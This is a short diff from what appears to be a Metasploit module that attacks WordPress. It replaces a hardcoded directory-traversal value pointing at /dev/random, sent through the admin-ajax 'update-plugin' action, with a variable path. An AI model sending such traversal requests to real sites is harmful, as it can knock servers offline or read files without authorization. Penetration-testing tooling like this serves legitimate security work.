@@ -147,7 +147,7 @@ class MetasploitModule < Msf::Auxiliary
                 'uri' => normalize_uri(wordpress_url_backend, 'admin-ajax.php'),
                 'vars_post' => {
                   'action' => 'update-plugin',
-                  'plugin' => '../../../../../../../../../../dev/random'
+                  'plugin' => path
                 },
                 'cookie' => cookie
               }, timeout = 0.2)
